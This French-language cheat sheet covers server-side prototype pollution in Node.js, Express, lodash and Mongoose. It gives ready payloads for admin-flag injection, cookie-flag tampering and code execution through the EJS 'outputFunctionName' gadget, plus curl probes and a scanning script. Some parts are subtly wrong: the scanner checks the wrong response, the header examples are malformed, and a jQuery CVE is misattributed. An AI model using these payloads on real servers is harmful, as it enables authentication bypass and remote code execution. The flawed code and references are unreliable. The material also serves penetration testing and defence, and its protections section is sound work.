---
name: server-side-prototype-pollution
description: Guide complet de Prototype Pollution côté serveur — Node.js, Express, MongoDB, injection de propriétés, RCE, exploitation, outils et payloads.
category: cybersecurite
tags: [prototype-pollution, nodejs, javascript, server-side, rce, ssti, express]
---

# Prototype Pollution Côté Serveur

## Sommaire
1. [Concepts](#concepts)
2. [Sources d'Injection](#sources-dinjection)
3. [Gadgets d'Exploitation](#gadgets-dexploitation)
4. [RCE via PP](#rce-via-pp)
5. [PP dans les Frameworks](#pp-dans-les-frameworks)
6. [PP dans MongoDB](#pp-dans-mongodb)
7. [Détection Automatisée](#detection-automatisee)
8. [Outils](#outils)

## Concepts

Prototype Pollution (PP) est une vulnérabilité JavaScript où l'attaquant modifie
le prototype d'un objet (`__proto__`, `constructor.prototype`, `prototype`)
pour injecter des propriétés qui affectent tous les objets de l'application.

### Principe :
```javascript
// Injection : modifier le prototype d'Object
{}.__proto__.isAdmin = true
// Désormais, TOUS les objets ont isAdmin = true

// Injection via merge
function merge(target, source) {
  for (let key in source) {
    if (isObject(source[key])) {
      if (!target[key]) target[key] = {}
      merge(target[key], source[key])
    } else {
      target[key] = source[key]
    }
  }
}

// L'attaquant envoie :
// {"__proto__": {"isAdmin": true}}
// → merge(obj, attackerInput)
// → Object.prototype.isAdmin = true
```

### Vecteurs d'injection côté serveur :
- **JSON.parse** d'une entrée utilisateur
- **Object.assign** non contrôlé
- **lodash.merge / _.defaultsDeep**
- **express body-parser** (JSON)
- **query string parsing** (qs, parseqs)
- **jQuery.extend** (deep copy)

## Sources d'Injection

### Via JSON body (POST/API) :
```json
// POST /api/update-profile
// Body :
{
  "name": "attacker",
  "__proto__": {
    "isAdmin": true,
    "bypassAuth": true
  }
}
```

### Via query string (qs library) :
```
GET /api/users?__proto__[isAdmin]=true
GET /api/endpoint?constructor[prototype][admin]=true
```

### Via headers :
```
x-forwarded-for: ["__proto__": ["admin": true]]
content-type: application/json; charset=utf-8; __proto__[auth]=bypass
```

### Via URL encoded body :
```
POST /api/update
Content-Type: application/x-www-form-urlencoded

__proto__[isAdmin]=true&name=attacker
```

## Gadgets d'Exploitation

Un gadget est une propriété spécifique qui, une fois polluée, déclenche
un comportement exploitable.

### Gadgets d'authentification (Express/Passport) :
```javascript
// Pollution de {}.isAdmin
// Si l'app vérifie if (user.isAdmin) → bypass

// Pollution de {}.bypassAuth
// Si le middleware vérifie la session
```

### Gadgets de configuration :
```javascript
// Express : res.render() options
__proto__[settings][view options][outputFunctionName]=x;console.log(1);//

// Exemple de SSTI via PP :
// res.render('template', {name: req.query.name})
// Payload : ?__proto__[settings][view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id')//
```

### Gadgets de session :
```javascript
// Pollution de la session
__proto__[cookie][path]=/
__proto__[cookie][httpOnly]=false
__proto__[cookie][secure]=false
```

## RCE via PP

### Express template engine (EJS) SSTI via PP :
```bash
# EJS utilise outputFunctionName dans les options
# Payload complet :
POST / HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "settings": {
      "view options": {
        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id')//"
      }
    }
  }
}

# Si l'app utilise res.render() après la pollution → RCE
```

### Autres gadgets RCE :
```javascript
// Node.js child_process.spawn options
__proto__[shell]=/bin/bash
__proto__[env][PATH]=/tmp/:$PATH

// JSON.stringify replacer
__proto__[toJSON]=function(){return require('child_process').execSync('id')}
```

## PP dans les Frameworks

### Lodash (CVE-2020-8203) :
```javascript
// lodash.merge vulnérable (< 4.17.20)
const _ = require('lodash')
_.merge({}, JSON.parse('{"__proto__": {"polluted": true}}'))
console.log({}.polluted) // true
```

### jQuery (CVE-2020-11023) :
```javascript
// $.extend(true, {}, input)
$.extend(true, {}, JSON.parse('{"__proto__": {"polluted": true}}'))
```

### Express body-parser + qs :
```javascript
// express @ 4.17.1
// qs (query string parser) vulnérable à la PP
// GET /?__proto__[polluted]=true
req.query.__proto__.polluted // "true"
```

### Mongoose/MongoDB PP :
```javascript
// Mongoose 5.x - injection dans les queries
// Permet de modifier le comportement des requêtes MongoDB
User.find({email: req.body.email})
// Payload :
// {"email": "admin@test.com", "__proto__": {"where": {"role": "admin"}}}
```

## PP dans MongoDB

### MongoDB injection via PP :
```javascript
// Sans PP :
User.find({email: "test@test.com", password: "secret"})
// → {email: "test@test.com", password: "secret"}

// Avec PP dans le query builder :
// Si le framework merge les options utilisateur dans la query :
// {"email": "test@test.com", "__proto__": {"where": {"role": "admin"}}}
// → tous les objets User héritent de where: {role: "admin"}
// → User.find retourne les admins
```

### Exploitation Mongoose :
```javascript
// Si l'app fait :
User.find(req.body)
// L'attaquant envoie :
// {"__proto__": {"where": {"role": "admin"}}, "email": "test"}
// → User.find est modifié pour inclure {role: "admin"}
// → tous les admins sont retournés
```

## Détection Automatisée

### Script de détection :
```python
import requests
import json

def test_prototype_pollution(url, endpoints):
    """Tester la PP sur des endpoints JSON"""
    
    payloads = [
        # PP standard
        {"__proto__": {"polluted": True}},
        {"constructor": {"prototype": {"polluted": True}}},
        # PP nested
        {"a": {"__proto__": {"polluted": True}}},
        # PP via JSON keys
        '{"__proto__": {"polluted": "true"}}',
        # PP array style
        {"__proto__[]": {"polluted": "true"}},
        # PP via Object.assign mimic
        {"a": {"b": {"__proto__": {"polluted": True}}}},
    ]
    
    for endpoint in endpoints:
        for payload in payloads:
            r = requests.post(f"{url}{endpoint}", json=payload)
            # Vérifier si l'API retourne une erreur spécifique
            print(f"[{r.status_code}] {endpoint}: {str(payload)[:50]}...")
            
            # Tester si pollution persistée
            test = requests.get(f"{url}/api/debug/check")  # endpoint qui retourne {}.polluted
            if "polluted" in r.text:
                print(f"[!] PP détectée sur {endpoint} !")
```

### Node.js detector :
```javascript
// Script de détection côté serveur
// Ajouter ce middleware pour tester :
app.use((req, res, next) => {
  const test = {};
  if (test.polluted !== undefined) {
    console.error('[!] Prototype Pollution détectée!');
  }
  next();
});
```

## Outils

### Server-Side PP Scanner :
```bash
# Server-Side Prototype Pollution Scanner (Burp)
# Extension Burp : Installer depuis BApp Store

# PP Scanner
git clone https://github.com/yeswehack/pp-detector.git
cd pp-detector
python pp-scanner.py -u https://target.com/api
```

### Node.js Testing :
```javascript
// Tester si l'application est vulnérable
const assert = require('assert');

function testPP() {
  const a = {};
  const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
  Object.assign(a, payload);
  
  // Créer un NOUVEL objet
  const b = {};
  if (b.polluted === "yes") {
    console.log("[!] Prototype Pollution VULNÉRABLE !");
    return true;
  }
  return false;
}
```

### curl test commands :
```bash
# Tester via query string
curl -v "https://target.com/api/endpoint?__proto__[test]=polluted"
curl -v "https://target.com/api/endpoint?constructor[prototype][test]=polluted"

# Tester via POST JSON
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Tester via headers
curl -v -H "X-Custom: {\"__proto__\": {\"admin\": true}}" \
  https://target.com/api/endpoint
```

### Burp Suite Extensions :
- **Server-Side Prototype Pollution Scanner** (BApp Store)
- **JSON Parser** (visualiser les payloads)
- **Turbo Intruder** (fuzzing)

## Protections

### Input sanitization :
```javascript
// 1. Supprimer les clés dangereuses
function sanitize(obj) {
  const dangerous = ['__proto__', 'prototype', 'constructor'];
  for (let key of dangerous) {
    delete obj[key];
  }
  return obj;
}

// 2. Utiliser JSONSchema validation
const Ajv = require('ajv');
const ajv = new Ajv();
ajv.addKeyword('notPrototypePollution', {
  validate: (schema, data) => {
    return !data || !data.__proto__ && !data.constructor;
  }
});

// 3. Freeze Object.prototype
Object.freeze(Object.prototype);

// 4. Utiliser Map au lieu d'objets pour les dictionnaires
const safe = new Map();
```

### Libraries sécurisées :
```javascript
// Lodash sécurisé (>= 4.17.20)
_.merge({}, input);  // Plus vulnérable

// Utiliser Object.create(null) pour les objets non prototypés
const safe = Object.create(null);

// Utiliser JSON.parse avec reviver
function safeParse(json) {
  return JSON.parse(json, (key, value) => {
    if (['__proto__', 'prototype', 'constructor'].includes(key)) {
      return undefined;
    }
    return value;
  });
}
```

## Ressources
- **HackTricks Prototype Pollution** : https://book.hacktricks.xyz/pentesting-web/deserialization/prototype-pollution
- **PortSwigger PP Research** : https://portswigger.net/research/prototype-pollution-attacks
- **PayloadsAllTheThings PP** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Prototype%20Pollution
- **Server-Side PP (PortSwigger)** : https://portswigger.net/web-security/prototype-pollution
- **CVE-2020-8203 (Lodash)** : https://security.snyk.io/vuln/SNYK-JS-LODASH-590103
- **PP Detection Guide** : https://github.com/yeswehack/pp-detector